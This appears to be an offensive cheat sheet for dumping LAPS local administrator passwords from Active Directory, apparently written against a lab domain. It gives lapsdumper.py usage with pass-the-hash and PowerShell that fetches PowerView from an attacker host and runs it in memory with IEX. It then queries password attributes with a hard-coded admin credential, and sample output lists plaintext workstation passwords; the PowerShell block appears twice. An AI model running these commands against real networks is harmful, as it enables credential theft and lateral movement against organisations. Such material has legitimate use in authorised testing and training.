# LAPS

* Dump laps passwords if you have a user account with the rights to dump the laps passwords
* Enumerate users that can read the laps passwords with bloodhound

### lapsdumper.py

Usage:

Basic:

`$ python laps.py -u user -p password -d domain.local`

Pass the Hash, specific LDAP server:

`$ python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local`

```
(new-object system.net.webclient).downloadstring('http://10.10.15.45/PowerView.ps1') | IEX
$SecPassword = ConvertTo-SecureString 'J5KCwKruINyCJBKd1dZU' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('RLAB\ngodfrey_adm',$SecPassword)
Get-DomainComputer ws01,ws02,ws03,ws04,ws05,ws06 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime -Credential $Cred
Get-DomainComputer ws02 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime -Credential $Cred

ms-mcs-admpwdexpirationtime ms-mcs-admpwd
--------------------------- -------------
ws01        133185858282921848 7Z74HKx6     
ws02        133185858955408843 Khb3SL8p     
ws03        133185859531299786 t25KAW60     
ws04        133185860137129767 l0Q7i5Xd     
ws05        133185860845564372 bzsn82zX     
ws06        133185861369786402 vPKNz69a  
```

### Powerview Dump

* Download Powersploit &#x20;

```
https://github.com/PowerShellMafia/PowerSploit/tree/dev
```

* zip the dir up and transfer the whole thing to target
* expand on target with `expand-archive`

```
import-module .\PowerSploit.psd1
--or--
(new-object system.net.webclient).downloadstring('http://10.10.15.45/PowerView.ps1') | IEX
#now it is loaded into mem either with IEX or with the import-module
$SecPassword = ConvertTo-SecureString 'PASSWORD_HERE' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('RLAB\ngodfrey_adm',$SecPassword)
Get-DomainComputer ws01,ws02,ws03,ws04,ws05,ws06 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime -Credential $Cred
Get-DomainComputer ws02 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime -Credential $Cred

ms-mcs-admpwdexpirationtime ms-mcs-admpwd
--------------------------- -------------
ws01        133185858282921848 7Z74HKx6     
ws02        133185858955408843 Khb3SL8p     
ws03        133185859531299786 t25KAW60     
ws04        133185860137129767 l0Q7i5Xd     
ws05        133185860845564372 bzsn82zX     
ws06        133185861369786402 vPKNz69a  
```
